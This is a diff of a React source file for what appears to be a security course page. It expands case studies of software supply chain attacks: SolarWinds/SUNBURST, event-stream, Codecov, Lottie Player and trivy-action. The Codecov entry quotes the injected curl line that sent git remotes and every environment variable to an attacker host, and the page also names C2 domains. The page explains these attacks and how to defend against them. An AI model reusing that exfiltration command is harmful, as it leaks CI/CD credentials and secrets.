@@ -46,21 +46,38 @@ const cases = [
     ],
     details: (
       <>
-        <h4>What Happened</h4>
-        <p>APT29 (Cozy Bear / Russian SVR) compromised SolarWinds' Orion build system. They implanted SUNSPOT malware that replaced a source file during compilation, injecting the SUNBURST backdoor into a legitimately signed update.</p>
-        <h4>Technical Details</h4>
+        <h4>The Story</h4>
+        <p>
+          This is the attack that put "supply chain" on every CISO's radar. Russian intelligence (APT29 / Cozy Bear),
+          linked to the SVR, spent months inside SolarWinds' network before touching the build system. Their
+          target: <strong>Orion</strong>, a network monitoring platform used by <strong>300,000 customers</strong>
+          including most Fortune 500 companies and US government agencies.
+        </p>
+        <p>
+          The attackers didn't modify source code in the repository &mdash; that would be caught by code review.
+          Instead, they planted <strong>SUNSPOT</strong>, a tool that watched the build server for
+          <code> MsBuild.exe</code> processes. When Orion was being compiled, SUNSPOT <strong>swapped a single
+          source file</strong> with a backdoored version, waited for compilation to finish, then <strong>restored
+          the original</strong>. The result: a trojanized DLL <em>legitimately signed</em> by SolarWinds' own
+          certificate. No developer ever saw malicious code in the repo.
+        </p>
+        <h4>What Made SUNBURST So Sophisticated</h4>
         <ul>
-          <li>SUNSPOT monitored MsBuild.exe and swapped source files during compilation</li>
-          <li>SUNBURST backdoor waited 12-14 days before activating</li>
-          <li>Used Domain Generation Algorithm (DGA) for C2 communication</li>
-          <li>C2 domains mimicked legitimate SolarWinds API traffic</li>
-          <li>Selective targeting: only high-value orgs received second-stage payloads</li>
-          <li>Compromised orgs include US Treasury, DHS, Microsoft, FireEye</li>
+          <li><strong>12-14 day dormancy:</strong> After installation, the backdoor slept for two weeks before activating, ensuring it survived any post-deployment testing period</li>
+          <li><strong>Domain Generation Algorithm (DGA):</strong> C2 communication used algorithmically generated subdomains of <code>avsvmcloud.com</code>, making DNS traffic look like normal SolarWinds API calls</li>
+          <li><strong>Anti-forensics:</strong> Checked for security tools (Wireshark, Fiddler, sandboxes) and disabled itself if detected</li>
+          <li><strong>Selective targeting:</strong> Of 18,000 infected organizations, only ~100 received second-stage payloads. The rest were left dormant to minimize detection risk</li>
+          <li><strong>Victims included:</strong> US Treasury, Department of Homeland Security, State Department, Microsoft, FireEye, Intel, Cisco, Deloitte</li>
         </ul>
         <h4>How It Was Discovered</h4>
-        <p>FireEye discovered it while investigating unauthorized access to their own Red Team tools. They traced the intrusion back to a trojanized SolarWinds Orion update.</p>
+        <p>
+          <strong>Irony:</strong> FireEye (now Mandiant), a cybersecurity company, discovered they'd been breached
+          when someone used stolen credentials to register a new device for MFA on an employee's account.
+          Investigating <em>their own breach</em>, they traced the intrusion back to the Orion update.
+          If FireEye hadn't been a customer, this could have gone undetected for years.
+        </p>
 
-        <h4>Attack Flow Visualization</h4>
+        <h4>Attack Flow</h4>
         <div className="illustration" style={{ margin: '0.75rem 0' }}>
           <div className="illustration-content">
             <FlowDiagram steps={[
@@ -73,7 +90,7 @@ const cases = [
         </div>
       </>
     ),
-    lesson: 'Source code review is not enough — the malicious code was only present during compilation. Signing doesn\'t equal safety.',
+    lesson: 'Source code review is not enough — the malicious code only existed during compilation. A legitimate digital signature doesn\'t mean the code is safe. Even FireEye, a security company, was a victim.',
   },
   {
     year: 'November 2018',
@@ -86,21 +103,37 @@ const cases = [
     ],
     details: (
       <>
-        <h4>What Happened</h4>
-        <p>The original maintainer of event-stream was burned out and handed over publishing rights to a stranger (right9ctrl). The attacker added a transitive dependency "flatmap-stream" containing encrypted malicious code.</p>
-        <h4>Technical Details</h4>
+        <h4>The Story</h4>
+        <p>
+          This case is a masterclass in social engineering the open-source ecosystem. <code>event-stream</code>
+          was a popular npm package with <strong>2 million weekly downloads</strong>. Its creator, Dominic Tarr,
+          was a prolific open-source contributor who had moved on to other projects. He no longer used
+          event-stream himself. Maintaining it was unpaid work he didn't want to do.
+        </p>
+        <p>
+          A GitHub user named <strong>"right9ctrl"</strong> sent Tarr an email offering to take over maintenance.
+          Tarr agreed &mdash; grateful someone cared. right9ctrl made a few legitimate-looking commits to build trust,
+          then <strong>added a new dependency</strong> called <code>flatmap-stream</code>. This package contained
+          the actual payload, but it was <strong>AES-256 encrypted</strong> and hidden inside a minified test
+          fixture file &mdash; impossible to read through static analysis.
+        </p>
+        <h4>The Elegant Targeting</h4>
         <ul>
-          <li>Payload was AES-encrypted — static analysis couldn't read it</li>
-          <li>Decryption key derived from Copay wallet's package description</li>
-          <li>Code only activated when running inside the Copay Bitcoin wallet app</li>
-          <li>Outside Copay, the code silently did nothing (avoiding detection)</li>
-          <li>Malicious code was hidden in a test fixture file</li>
-          <li>Intercepted wallet private keys during transaction signing</li>
+          <li><strong>Encrypted payload:</strong> The malicious code was AES-encrypted. Static analysis tools couldn't read it. <code>npm audit</code> saw nothing wrong.</li>
+          <li><strong>The decryption key</strong> was derived from the <code>description</code> field in the <strong>Copay Bitcoin wallet's</strong> <code>package.json</code>. This meant the code <em>only decrypted and executed inside Copay</em>.</li>
+          <li><strong>Everywhere else</strong> the encrypted payload remained dormant, inert data. Your tests passed. Your app worked. No errors, no warnings.</li>
+          <li><strong>When active in Copay:</strong> The code intercepted the <code>bitcore-wallet-client</code> library's <code>getKeys()</code> method, stealing Bitcoin private keys during transaction signing</li>
+          <li><strong>Hidden in a transitive dependency:</strong> Developers who depended on event-stream never knew flatmap-stream existed. Trust was <em>transitive</em>.</li>
         </ul>
-        <h4>How It Was Discovered</h4>
-        <p>Developer Ayrton Sparling (FallingSnow) noticed the unusual dependency while reviewing updates and raised a GitHub issue.</p>
+        <h4>Discovery</h4>
+        <p>
+          Developer <strong>Ayrton Sparling</strong> (GitHub: FallingSnow) noticed a deprecation warning from
+          a new dependency while reviewing his project's updates. Curious, he dug into flatmap-stream's source,
+          found the encrypted blob, and raised <strong>GitHub issue #116</strong> on event-stream. The open-source
+          community quickly deobfuscated the payload and confirmed the targeted Copay attack.
+        </p>
 
-        <h4>Attack Flow Visualization</h4>
+        <h4>Attack Flow</h4>
         <div className="illustration" style={{ margin: '0.75rem 0' }}>
           <div className="illustration-content">
             <FlowDiagram steps={[
@@ -115,7 +148,7 @@ const cases = [
         <YouTubeEmbed id="cvumD7bhLWU" caption="event-stream: Analysis of a compromised npm package" />
       </>
     ),
-    lesson: 'Maintainer burnout is a security risk. Trust is transitive — trusting event-stream meant trusting flatmap-stream.',
+    lesson: 'Maintainer burnout is a systemic security risk. Trust is transitive — trusting event-stream meant implicitly trusting every dependency it adds. One curious developer\'s vigilance saved the ecosystem.',
   },
   {
     year: 'January – April 2021',
@@ -123,24 +156,41 @@ const cases = [
     type: 'CI/CD Pipeline Compromise // T1195.002',
     impact: [
       { value: '3 mo', label: 'Duration' },
-      { value: '1000s', label: 'Orgs Affected' },
+      { value: '29,000', label: 'Customers' },
       { value: 'Keys', label: 'Secrets Leaked' },
     ],
     details: (
       <>
-        <h4>What Happened</h4>
-        <p>Attackers exploited a flaw in Codecov's Docker image creation to modify their Bash Uploader script. A single injected line exfiltrated ALL environment variables from every CI/CD pipeline using the script.</p>
-        <h4>The Injected Line</h4>
+        <h4>The Story</h4>
+        <p>
+          Codecov is a code coverage reporting tool used by <strong>29,000 organizations</strong> including
+          Atlassian, GoDaddy, Procter & Gamble, and the Washington Post. Their integration works via a
+          Bash script that developers pipe into their CI/CD pipelines: <code>curl -s https://codecov.io/bash | bash</code>.
+          If that script is compromised, every pipeline running it is compromised.
+        </p>
+        <p>
+          In January 2021, attackers discovered a flaw in Codecov's Docker image creation process that allowed
+          them to extract the credential used to update the Bash Uploader script. They added <strong>a single
+          line of code</strong> to the script &mdash; one <code>curl</code> command that exfiltrated every
+          environment variable from every CI/CD pipeline that ran it.
+        </p>
+        <h4>The Injected Line (One Line, Thousands of Victims)</h4>
         <ul>
           <li><code>curl -sm 0.5 -d "$(git remote -v){'<<<'}{'<<<'} ENV $(env)" http://attacker-ip/upload || true</code></li>
-          <li>Collected git remote URLs and ALL environment variables</li>
-          <li>Exfiltrated API keys, AWS credentials, npm tokens, database passwords</li>
-          <li>The <code>|| true</code> ensured the pipeline continued normally</li>
+          <li>This single line collected: git remote URLs (revealing internal repo names), and <strong>every environment variable</strong> &mdash; <code>AWS_SECRET_ACCESS_KEY</code>, <code>NPM_TOKEN</code>, <code>GITHUB_TOKEN</code>, <code>DATABASE_URL</code>, everything</li>
+          <li>The <code>-sm 0.5</code> flag made it silent with a 0.5s timeout (so CI didn't slow down noticeably)</li>
+          <li>The <code>|| true</code> ensured if the exfiltration failed, the pipeline continued normally &mdash; no errors, no alerts</li>
+          <li>This ran undetected for <strong>3 months</strong> across thousands of organizations' CI/CD pipelines</li>
         </ul>
-        <h4>How It Was Discovered</h4>
-        <p>A customer noticed the SHA-256 hash of the downloaded script didn't match the hash on Codecov's GitHub repository.</p>
+        <h4>Discovery & Aftermath</h4>
+        <p>
+          A security-conscious customer downloaded the Bash Uploader and computed its SHA-256 hash.
+          It didn't match the hash listed on Codecov's GitHub repository. That simple check &mdash; comparing
+          a hash &mdash; is what caught a 3-month-long breach. Twitch was among the affected companies;
+          their source code was later leaked, partly traced back to credentials stolen through Codecov.
+        </p>
 
-        <h4>Attack Flow Visualization</h4>
+        <h4>Attack Flow</h4>
         <div className="illustration" style={{ margin: '0.75rem 0' }}>
           <div className="illustration-content">
             <FlowDiagram steps={[
@@ -153,7 +203,7 @@ const cases = [
         </div>
       </>
     ),
-    lesson: 'The "curl | bash" pattern is dangerous. CI/CD environments need secret minimization and integrity verification.',
+    lesson: 'The "curl | bash" pattern is fundamentally dangerous — you\'re executing whatever the server sends. Always verify script integrity. Minimize secrets in CI/CD. One hash check caught a 3-month breach.',
   },
   {
     year: 'October 2024',
@@ -166,21 +216,39 @@ const cases = [
     ],
     details: (
       <>
-        <h4>What Happened</h4>
-        <p>An attacker stole an npm maintainer's access token for @lottiefiles/lottie-player and published malicious versions (2.0.5, 2.0.6, 2.0.7) that injected a cryptocurrency wallet drainer into every website using the library.</p>
-        <h4>Technical Details</h4>
+        <h4>The Story</h4>
+        <p>
+          <strong>Lottie Player</strong> by LottieFiles is a widely-used web component for rendering Lottie
+          animations. Thousands of websites embed it directly from npm/CDN for animated graphics, loading
+          spinners, and interactive illustrations. In October 2024, an attacker <strong>stole an npm
+          maintainer's authentication token</strong> and used it to publish three malicious versions:
+          <code> 2.0.5</code>, <code>2.0.6</code>, and <code>2.0.7</code>.
+        </p>
+        <h4>What the Malicious Code Did</h4>
         <ul>
-          <li>Malicious code injected a "Connect Wallet" popup overlay</li>
-          <li>Supported MetaMask, Coinbase Wallet, and other providers</li>
-          <li>Connected wallets were drained of all tokens and NFTs</li>
-          <li>C2 server: <code>castleservices01[.]com</code></li>
-          <li>Websites loading via CDN with <code>@latest</code> were auto-affected</li>
+          <li>Injected a full-screen <strong>"Connect Wallet" popup overlay</strong> on every website loading the library</li>
+          <li>Supported MetaMask, Coinbase Wallet, WalletConnect, and other popular crypto wallet providers</li>
+          <li>When a user connected their wallet (thinking it was part of the website), <strong>all tokens, NFTs, and cryptocurrency were drained</strong> to the attacker's wallet</li>
+          <li>C2 server at <code>castleservices01[.]com</code> coordinated the drain operations</li>
+          <li>Any website loading via CDN with <code>@latest</code> was <strong>automatically</strong> affected &mdash; no action needed from the site owner</li>
+          <li>At least one victim reported losing <strong>$723,000 in Bitcoin</strong> from a single wallet connection</li>
         </ul>
-        <h4>This Is the TryHackMe Lab</h4>
-        <p>This exact case is what you'll explore hands-on in the "Supply Chain Attack: Lottie" room on TryHackMe.</p>
+        <h4>Why <code>@latest</code> is Dangerous</h4>
+        <p>
+          Sites that loaded <code>{'<'}script src="https://cdn.jsdelivr.net/npm/@lottiefiles/lottie-player@latest"{'>'}</code>
+          were instantly compromised when v2.0.5 was published. The CDN served the newest version automatically.
+          Sites that pinned to <code>@2.0.4</code> (the last clean version) were <strong>completely unaffected</strong>.
+          This is the difference between <code>@latest</code> and a pinned version.
+        </p>
+        <h4>Hands-On Lab</h4>
+        <p>
+          This exact case is the basis for the <strong>TryHackMe "Supply Chain Attack: Lottie" room</strong> that
+          we'll work through in our labs section. You'll analyze the malicious code, trace the wallet drainer,
+          and understand the attack timeline.
+        </p>
       </>
     ),
-    lesson: 'Never use @latest for CDN scripts. Use Subresource Integrity (SRI) hashes. Protect npm tokens with MFA.',
+    lesson: 'Never use @latest for CDN scripts — pin exact versions. Use Subresource Integrity (SRI) hashes to verify script content. Protect npm tokens with MFA and IP allowlists. One stolen token = every website using your library is compromised.',
   },
   {
     year: 'March 2026',
@@ -193,21 +261,38 @@ const cases = [
     ],
     details: (
       <>
-        <h4>What Happened</h4>
-        <p>Attackers compromised GitHub PATs and manipulated 75 of 76 version tags in aquasecurity/trivy-action, a widely-used security scanner. The poisoned action stole credentials from 10,000+ CI/CD workflows.</p>
-        <h4>Technical Details</h4>
+        <h4>The Story</h4>
+        <p>
+          This is the most <strong>recent and most alarming</strong> supply chain attack. It started with
+          <code> tj-actions/changed-files</code> in early 2025 (23,000+ repos affected) and <strong>cascaded</strong>
+          into something far worse. Using tokens stolen in the tj-actions breach, attackers went after a
+          bigger target: <strong>aquasecurity/trivy-action</strong>, one of the most popular security scanning
+          tools in the GitHub Actions ecosystem.
+        </p>
+        <p>
+          The irony is staggering: <strong>Trivy is a vulnerability scanner</strong>. Organizations use it to
+          <em>detect</em> security issues in their code. The attackers weaponized the very tool companies trusted
+          to keep them safe. They modified <strong>75 of 76 version tags</strong> to point to malicious code that
+          exfiltrated CI/CD secrets from every workflow that ran it.
+        </p>
+        <h4>The Cascading Attack Chain</h4>
         <ul>
-          <li>Trivy is a SECURITY SCANNER — irony of weaponizing a security tool</li>
-          <li>Stole cloud credentials, SSH keys, npm/PyPI tokens</li>
-          <li>Stolen npm tokens used to deploy CanisterWorm malware</li>
-          <li>CanisterWorm uses blockchain-based C2 (commands stored on-chain)</li>
-          <li>Cannot be taken down via domain seizure — decentralized and immutable</li>
+          <li><strong>Step 1:</strong> Compromise tj-actions via a stolen maintainer PAT (Personal Access Token). 23,000+ repos leak their CI/CD secrets.</li>
+          <li><strong>Step 2:</strong> Among the stolen credentials: tokens with write access to aquasecurity/trivy-action</li>
+          <li><strong>Step 3:</strong> Rewrite 75 of 76 version tags in trivy-action to point to malicious code. 10,000+ workflows now execute attacker code.</li>
+          <li><strong>Step 4:</strong> Harvest npm/PyPI tokens from trivy-action victims and publish <strong>CanisterWorm</strong> malware to package registries</li>
         </ul>
-        <h4>New Frontier: Blockchain C2</h4>
-        <p>Traditional C2: seize domain, done. CanisterWorm C2: commands live on-chain forever. No single point of failure. Cannot be censored or taken down.</p>
+        <h4>CanisterWorm: The Next-Gen C2</h4>
+        <p>
+          Traditional malware uses domain-based C2: authorities seize the domain, game over. CanisterWorm
+          stores its command-and-control instructions <strong>on a blockchain</strong>. Commands are recorded
+          on-chain, immutable, and decentralized. You cannot take down a blockchain. You cannot seize a smart
+          contract. You cannot censor on-chain data. This is the <strong>first widely documented supply chain
+          attack using blockchain C2</strong>, and it represents a fundamental shift in how attackers maintain persistence.
+        </p>
       </>
     ),
-    lesson: 'Pin GitHub Actions to commit SHAs, not tags. Even security tools can be weaponized. Blockchain C2 is the future threat.',
+    lesson: 'Pin GitHub Actions to commit SHAs, never tags. Even security tools can be weaponized. Supply chain attacks cascade — one breach enables the next. Blockchain C2 represents a new era of unkillable command infrastructure.',
   },
 ];
 
